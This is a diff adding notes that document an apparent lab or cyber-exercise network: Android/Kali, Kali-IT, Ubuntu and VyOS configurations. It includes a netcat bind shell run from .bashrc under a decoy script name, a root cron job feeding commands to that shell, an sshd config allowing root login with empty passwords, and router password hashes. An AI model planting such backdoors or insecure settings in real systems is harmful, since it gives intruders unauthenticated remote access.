@@ -1,0 +1,387 @@
+====ANDROID====
+The following was added to the terminal initial command under preferances for the android:
+su -c "busybox ifconfig eth1 72.143.92.234 up"; su -c "busybox ifconfig eth0 192.168.5.105 up"; su -c "/data/data/ru.meefik.linuxdeploy/bin/linuxdeploy shell"
+
+The following was added to the .bashrc in the mini-kali inside the android:
+service ssh start > /dev/null
+route add -net 98.43.26.5 netmask 255.255.255.255 dev eth1
+route add -net 0.0.0.0 gw 192.168.5.1 dev eth0
+
+
+====KALI-IT====
+The following was added to the .bashrc in the Kali-IT:
+ifconfig eth0 192.168.2.3 up
+route add -net 0.0.0.0 gw 192.168.2.1 dev eth0
+/root/testscript.plsignore.pls > /dev/null & 
+
+
+The following is the contents of testscript.plsignore.pls on Kali-IT:
+#!/bin/bash
+
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/root/
+
+
+while true; do
+	if netstat -l | grep '12345'
+	  then echo
+	  else nc -l -p 12345 -e /bin/bash
+	fi
+done
+
+
+====Ubuntu====
+The following is the root level crontab command on the ubuntu machine:
+* * * * * echo "/bin/echo 'boop' >> /root/log.log" | nc 192.168.2.3 12345
+
+The following is the modified sshd_config file from the ubuntu machine:
+]0;root@seed-virtual-machine: ~root@seed-virtual-machine:~# cat /etc/ssh/sshd_config 
+# Package generated configuration file
+# See the sshd_config(5) manpage for details
+
+# What ports, IPs and protocols we listen for
+Port 443
+# Use these options to restrict which interfaces/protocols sshd will bind to
+#ListenAddress ::
+#ListenAddress 0.0.0.0
+Protocol 2
+# HostKeys for protocol version 2
+HostKey /etc/ssh/ssh_host_rsa_key
+HostKey /etc/ssh/ssh_host_dsa_key
+HostKey /etc/ssh/ssh_host_ecdsa_key
+HostKey /etc/ssh/ssh_host_ed25519_key
+#Privilege Separation is turned on for security
+UsePrivilegeSeparation yes
+
+# Lifetime and size of ephemeral version 1 server key
+KeyRegenerationInterval 3600
+ServerKeyBits 1024
+
+# Logging
+SyslogFacility AUTH
+LogLevel INFO
+
+# Authentication:
+LoginGraceTime 120
+PermitRootLogin yes
+StrictModes no
+
+RSAAuthentication no
+PubkeyAuthentication no
+#AuthorizedKeysFile	%h/.ssh/authorized_keys
+
+# Don't read the user's ~/.rhosts and ~/.shosts files
+IgnoreRhosts yes
+# For this to work you will also need host keys in /etc/ssh_known_hosts
+RhostsRSAAuthentication no
+# similar for protocol version 2
+HostbasedAuthentication no
+# Uncomment if you don't trust ~/.ssh/known_hosts for RhostsRSAAuthentication
+#IgnoreUserKnownHosts yes
+
+# To enable empty passwords, change to yes (NOT RECOMMENDED)
+PermitEmptyPasswords yes
+
+# Change to yes to enable challenge-response passwords (beware issues with
+# some PAM modules and threads)
+ChallengeResponseAuthentication no
+
+# Change to no to disable tunnelled clear text passwords
+PasswordAuthentication yes
+
+# Kerberos options
+#KerberosAuthentication no
+#KerberosGetAFSToken no
+#KerberosOrLocalPasswd yes
+#KerberosTicketCleanup yes
+
+# GSSAPI options
+#GSSAPIAuthentication no
+#GSSAPICleanupCredentials yes
+
+X11Forwarding yes
+X11DisplayOffset 10
+PrintMotd no
+PrintLastLog yes
+TCPKeepAlive yes
+#UseLogin no
+
+#MaxStartups 10:30:60
+#Banner /etc/issue.net
+
+# Allow client to pass locale environment variables
+AcceptEnv LANG LC_*
+
+Subsystem sftp /usr/lib/openssh/sftp-server
+
+# Set this to 'yes' to enable PAM authentication, account processing,
+# and session processing. If this is enabled, PAM authentication will
+# be allowed through the ChallengeResponseAuthentication and
+# PasswordAuthentication.  Depending on your PAM configuration,
+# PAM authentication via ChallengeResponseAuthentication may bypass
+# the setting of "PermitRootLogin without-password".
+# If you just want the PAM account and session checks to run without
+# PAM authentication, then enable this but set PasswordAuthentication
+# and ChallengeResponseAuthentication to 'no'.
+UsePAM no
+
+
+The following is the modified interfaces file on the ubuntu machine:
+root@seed-virtual-machine:/etc/network# cat interfaces
+# interfaces(5) file used by ifup(8) and ifdown(8)
+auto lo
+iface lo inet loopback
+
+auto ens160
+iface ens160 inet static
+	address 192.168.4.2
+	netmask 255.255.255.0
+	gateway 192.168.4.1
+
+
+====VyOS====
+The following is the config of the vyos router:
+]0;duck@vyos: ~duck@vyos:~$ cat / /config/config.boot 
+firewall {
+    all-ping enable
+    broadcast-ping disable
+    config-trap disable
+    ipv6-receive-redirects disable
+    ipv6-src-route disable
+    ip-src-route disable
+    log-martians enable
+    name IndCtrlSys {
+        default-action drop
+        rule 1 {
+            action accept
+            source {
+                address 192.168.1.3
+            }
+        }
+    }
+    name Tech {
+        default-action accept
+        rule 1 {
+            action drop
+            destination {
+                address 192.168.3.0-192.168.3.255
+            }
+        }
+    }
+    name WiFi {
+        default-action drop
+        rule 1 {
+            action accept
+            destination {
+                address 192.168.4.2
+            }
+        }
+        rule 2 {
+            action accept
+            destination {
+                address 192.168.0.0-192.168.0.255
+                port 80,443
+            }
+            protocol tcp_udp
+        }
+    }
+    name WrkSta {
+        default-action accept
+        rule 1 {
+            action drop
+            destination {
+                address 192.168.2.0-192.168.2.255
+            }
+        }
+        rule 2 {
+            action drop
+            destination {
+                address 192.168.3.2
+            }
+            source {
+                address !192.168.1.3
+            }
+        }
+    }
+    receive-redirects disable
+    send-redirects enable
+    source-validation disable
+    syn-cookies enable
+    twa-hazards-protection disable
+}
+interfaces {
+    ethernet eth0 {
+        address 192.168.0.1/24
+        description Outside
+        duplex auto
+        hw-id 00:50:56:8c:ad:c4
+        smp_affinity auto
+        speed auto
+    }
+    ethernet eth1 {
+        address 192.168.1.1/24
+        description Window
+        duplex auto
+        firewall {
+            in {
+                name WrkSta
+            }
+        }
+        hw-id 00:50:56:8c:47:61
+        smp_affinity auto
+        speed auto
+    }
+    ethernet eth2 {
+        address 192.168.2.1/24
+        description IT
+        duplex auto
+        firewall {
+            in {
+                name Tech
+            }
+        }
+        hw-id 00:50:56:8c:b7:a3
+        smp_affinity auto
+        speed auto
+    }
+    ethernet eth3 {
+        address 192.168.3.1/24
+        description ICS
+        duplex auto
+        firewall {
+            out {
+                name IndCtrlSys
+            }
+        }
+        hw-id 00:50:56:8c:53:30
+        smp_affinity auto
+        speed auto
+    }
+    ethernet eth4 {
+        address 192.168.4.1/24
+        description Web
+        duplex auto
+        hw-id 00:50:56:8c:d8:51
+        smp_affinity auto
+        speed auto
+    }
+    ethernet eth5 {
+        address 192.168.5.1/24
+        description WiFi
+        duplex auto
+        firewall {
+            in {
+                name WiFi
+            }
+        }
+        hw-id 00:50:56:8c:2e:14
+        smp_affinity auto
+        speed auto
+    }
+    loopback lo
+}
+nat {
+    destination {
+        rule 9 {
+            destination {
+                address 192.168.0.1
+                port 443
+            }
+            inbound-interface eth0
+            protocol tcp_udp
+            translation {
+                address 192.168.4.2
+                port 5900
+            }
+        }
+        rule 10 {
+            destination {
+                address 192.168.0.1
+                port 80
+            }
+            inbound-interface eth0
+            protocol tcp_udp
+            translation {
+                address 192.168.4.2
+            }
+        }
+        rule 11 {
+            destination {
+                address !192.168.0.1
+            }
+            inbound-interface eth0
+            translation {
+                address 192.168.6.6
+            }
+        }
+    }
+}
+service {
+    ssh {
+        listen-address 192.168.1.1
+        port 911
+    }
+}
+system {
+    config-management {
+        commit-revisions 20
+    }
+    console {
+    }
+    host-name vyos
+    ipv6 {
+        blacklist {
+        }
+    }
+    login {
+        user duck {
+            authentication {
+                encrypted-password $6$rmbf4mXp.Z$MmWOlvZhvudiOcR/GWu.0IeSjeMIClZW/tlVap8ycmOYARQuBn3ONrWtU1pVbEqY5qMjmOKZfoe5WRij1fOx.1
+                plaintext-password ""
+            }
+            level admin
+        }
+        user franku {
+            authentication {
+                encrypted-password $6$0SYl.ICncWx19V$Aliz3ObuIjjzqwAVAEvnnGBxut6eC/pIC27cyHP7B8Bqj4y7r5fycU7tYJ4MZjiqzXS0SxTPQSh7FA6TarcI6/
+                plaintext-password ""
+            }
+            full-name "James Franku"
+            level operator
+        }
+    }
+    name-server 8.8.8.8
+    ntp {
+        server 0.pool.ntp.org
+        server 1.pool.ntp.org
+        server 2.pool.ntp.org
+        server time-c.nist.gov {
+            prefer {
+            }
+        }
+    }
+    package {
+        auto-sync 1
+        repository community {
+            components main
+            distribution helium
+            password ""
+            url http://packages.vyos.net/vyos
+            username ""
+        }
+    }
+    syslog {
+        global {
+            facility all {
+                level notice
+            }
+            facility protocols {
+                level debug
+            }
+        }
+    }
+    time-zone UTC
+}
+/* Warning: Do not remove the following line. */
+/* === vyatta-config-version: "cluster@1:firewall@5:conntrack@1:system@6:webproxy@1:config-management@1:conntrack-sync@1:wanloadbalance@3:zone-policy@1:nat@4:ipsec@4:dhcp-relay@1:cron@1:dhcp-server@4:vrrp@1:quagga@2:qos@1:webgui@1" === */
+/* Release version: VyOS 1.1.7 */
+
